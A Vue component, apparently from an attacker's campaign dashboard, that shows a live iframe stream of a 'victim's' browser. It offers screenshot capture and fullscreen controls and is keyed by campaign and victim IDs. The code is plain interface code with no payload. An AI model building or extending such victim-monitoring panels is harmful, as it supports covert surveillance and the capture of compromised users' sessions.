<script setup>
import { ref, computed, onMounted, onBeforeUnmount } from 'vue'
import { useToast } from 'primevue/usetoast'

const props = defineProps({
    streamUrl: {
        type: String,
        default: null
    },
    campaignId: {
        type: String,
        required: true
    },
    victimId: {
        type: String,
        required: true
    },
    isLive: {
        type: Boolean,
        default: false
    },
    capturePending: {
        type: Boolean,
        default: false
    }
})

const emit = defineEmits(['capture-requested'])
const toast = useToast()

// Refs
const container = ref(null)
const iframeRef = ref(null)
const isFullscreen = ref(false)
const showControls = ref(true)

// Computed
const fullStreamUrl = computed(() => {
    if (!props.streamUrl) return null

    try {
        const url = new URL(props.streamUrl)
        url.hash = '#shared'

        return url.toString()
    } catch (error) {
        console.error('Invalid stream URL:', error)
        return props.streamUrl
    }
})

const isStreaming = computed(() => !!props.streamUrl && props.isLive)

const captureScreenshot = () => {
    if (isStreaming.value && !props.capturePending) {
        emit('capture-requested')
    }
}

// Methods
const toggleFullscreen = async () => {
    if (!container.value) return

    try {
        if (!document.fullscreenElement) {
            await container.value.requestFullscreen()
            isFullscreen.value = true
            showControls.value = false

            toast.add({
                severity: 'info',
                summary: 'Fullscreen Mode',
                detail: 'Press ESC to exit',
                life: 2000
            })
        } else {
            await document.exitFullscreen()
            isFullscreen.value = false
            showControls.value = true
        }
    } catch (error) {
        console.error('Fullscreen error:', error)
        toast.add({
            severity: 'error',
            summary: 'Fullscreen Error',
            detail: 'Could not enter fullscreen mode',
            life: 3000
        })
    }
}

const handleFullscreenChange = () => {
    isFullscreen.value = !!document.fullscreenElement
    showControls.value = !isFullscreen.value
}

// Lifecycle
onMounted(() => {
    document.addEventListener('fullscreenchange', handleFullscreenChange)
})

onBeforeUnmount(() => {
    document.removeEventListener('fullscreenchange', handleFullscreenChange)

    // Exit fullscreen if active
    if (document.fullscreenElement) {
        document.exitFullscreen()
    }
})
</script>

<template>
    <Card class="stream-card">
        <template #title>
            <div class="stream-header">
                <div class="header-left">
                    <span v-if="isStreaming" class="status-badge streaming">
                        <i class="pi pi-circle-fill"></i>
                        Live
                    </span>
                    <span v-else class="status-badge offline">
                        <i class="pi pi-circle"></i>
                        Offline
                    </span>
                </div>

                <div v-if="showControls" class="header-actions">
                    <Button
                        icon="pi pi-camera"
                        :loading="capturePending"
                        size="small"
                        text
                        rounded
                        @click="captureScreenshot"
                        v-tooltip.bottom="'Capture Screenshot (S)'"
                        :disabled="!isStreaming"
                    />

                    <Button
                        :icon="isFullscreen ? 'pi pi-window-minimize' : 'pi pi-window-maximize'"
                        size="small"
                        text
                        rounded
                        @click="toggleFullscreen"
                        v-tooltip.bottom="'Toggle Fullscreen (F)'"
                        :disabled="!isStreaming"
                    />
                </div>
            </div>
        </template>

        <template #content>
            <div
                ref="container"
                class="stream-container"
                :class="{ fullscreen: isFullscreen, 'no-stream': !isStreaming }"
            >
                <!-- Stream iframe -->
                <iframe
                    v-if="isStreaming && fullStreamUrl"
                    ref="iframeRef"
                    :src="fullStreamUrl"
                    :name="victimId"
                    class="stream-iframe"
                    style="width: 100%; height: 100%; border: none;"
                    allowfullscreen
                    allow="camera; microphone; display-capture"
                    sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-pointer-lock allow-top-navigation"
                />

                <!-- No stream state -->
                <div v-else class="no-stream-state">
                    <i class="pi pi-video"></i>
                    <p>{{ streamUrl ? 'Stream Offline' : 'No Stream Available' }}</p>
                    <small v-if="!streamUrl">Waiting for victim to connect...</small>
                    <small v-else>The victim's browser is not streaming</small>
                </div>

                <!-- Fullscreen overlay controls -->
                <div v-if="isFullscreen" class="fullscreen-controls">
                    <div class="controls-overlay">
                        <Button
                            icon="pi pi-camera"
                            :loading="capturePending"
                            text
                            rounded
                            size="large"
                            @click="captureScreenshot"
                            v-tooltip.top="'Screenshot (S)'"
                        />

                        <Button
                            icon="pi pi-times"
                            text
                            rounded
                            size="large"
                            @click="toggleFullscreen"
                            v-tooltip.top="'Exit (ESC)'"
                        />
                    </div>
                </div>

                <!-- Stream info overlay -->
                <div v-if="isStreaming && !isFullscreen" class="stream-info">
                    <span class="info-item">
                        <i class="pi pi-clock"></i>
                        {{ new Date().toLocaleTimeString() }}
                    </span>
                    <span class="info-item">
                        <i class="pi pi-desktop"></i>
                    </span>
                </div>
            </div>
        </template>
    </Card>
</template>

<style scoped>
.stream-card {
    height: 100%;
    width: 100%;
}

.stream-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 1rem;
    flex-wrap: wrap;
}

.header-left {
    display: flex;
    align-items: center;
    gap: 0.75rem;
}

.stream-title {
    font-size: 1rem;
    font-weight: 600;
    color: var(--color-heading);
}

.status-badge {
    display: flex;
    align-items: center;
    gap: 0.375rem;
    font-size: 0.75rem;
    padding: 0.25rem 0.625rem;
    border-radius: 12px;
    font-weight: 500;
}

.status-badge.streaming {
    background-color: var(--danger-subtle);
    color: var(--danger);
}

.status-badge.streaming i {
    animation: pulse 2s infinite;
}

.status-badge.offline {
    background-color: var(--color-background-mute);
    color: var(--color-text-mute);
}

@keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
}

.header-actions {
    display: flex;
    gap: 0.5rem;
    align-items: center;
}

/* Stream Container */
.stream-container {
    position: relative;
    width: 100%;
    height: 65vh;
    background-color: #000;
    border-radius: 6px;
    overflow: hidden;
    border: 1px solid var(--color-border);
}

.stream-container.fullscreen {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw !important;
    height: 100vh !important;
    z-index: 9999;
    border-radius: 0;
    border: none;
}

.stream-container.no-stream {
    display: flex;
    align-items: center;
    justify-content: center;
}

/* Stream iframe */
.stream-iframe {
    width: 100%;
    height: 100%;
    border: none;
    display: block;
    object-fit: contain;
}

/* No stream state */
.no-stream-state {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 0.75rem;
    color: rgba(255, 255, 255, 0.6);
    text-align: center;
    padding: 2rem;
}

.no-stream-state i {
    font-size: 3rem;
    opacity: 0.5;
}

.no-stream-state p {
    margin: 0;
    font-size: 1rem;
    font-weight: 500;
    color: rgba(255, 255, 255, 0.8);
}

.no-stream-state small {
    font-size: 0.875rem;
    opacity: 0.7;
}

/* Fullscreen controls */
.fullscreen-controls {
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    background: linear-gradient(to top, rgba(0,0,0,0.8) 0%, transparent 100%);
    padding: 2rem 2rem 1rem 2rem;
    opacity: 0;
    transition: opacity 0.3s;
    pointer-events: none;
}

.stream-container.fullscreen:hover .fullscreen-controls {
    opacity: 1;
    pointer-events: all;
}

.controls-overlay {
    display: flex;
    justify-content: center;
    gap: 1rem;
}

.controls-overlay .p-button {
    background-color: rgba(255, 255, 255, 0.1) !important;
    color: white !important;
    backdrop-filter: blur(10px);
}

.controls-overlay .p-button:hover {
    background-color: rgba(255, 255, 255, 0.2) !important;
}

/* Stream info overlay */
.stream-info {
    position: absolute;
    top: 0.75rem;
    left: 0.75rem;
    display: flex;
    flex-direction: column;
    gap: 0.375rem;
    pointer-events: none;
}

.info-item {
    display: flex;
    align-items: center;
    gap: 0.375rem;
    font-size: 0.75rem;
    padding: 0.25rem 0.625rem;
    background-color: rgba(0, 0, 0, 0.6);
    color: rgba(255, 255, 255, 0.9);
    border-radius: 4px;
    backdrop-filter: blur(10px);
    width: fit-content;
}

.info-item i {
    font-size: 0.7rem;
    opacity: 0.8;
}

/* Keyboard shortcuts hint */
.shortcuts-hint {
    margin-top: 0.75rem;
    text-align: center;
    color: var(--color-text-mute);
}

.shortcuts-hint small {
    font-size: 0.75rem;
}

.shortcuts-hint kbd {
    padding: 0.125rem 0.375rem;
    background-color: var(--color-background-mute);
    border: 1px solid var(--color-border);
    border-radius: 3px;
    font-family: monospace;
    font-size: 0.7rem;
    font-weight: 600;
}

/* Responsive */
@media (max-width: 768px) {
    .stream-container {
        height: 50vh;
    }

    .stream-header {
        flex-direction: column;
        align-items: stretch;
    }

    .header-actions {
        justify-content: flex-end;
        flex-wrap: wrap;
    }

    .fullscreen-controls {
        padding: 1rem;
    }

    .controls-overlay {
        gap: 0.5rem;
    }

    .shortcuts-hint {
        display: none;
    }
}

/* ESC hint animation in fullscreen */
.stream-container.fullscreen::after {
    content: 'Press ESC to exit fullscreen';
    position: absolute;
    top: 1rem;
    left: 50%;
    transform: translateX(-50%);
    padding: 0.5rem 1rem;
    background-color: rgba(0, 0, 0, 0.8);
    color: white;
    border-radius: 4px;
    font-size: 0.875rem;
    opacity: 0;
    animation: fadeInOut 3s ease-in-out;
    pointer-events: none;
}

@keyframes fadeInOut {
    0%, 100% { opacity: 0; }
    10%, 90% { opacity: 1; }
}
</style>
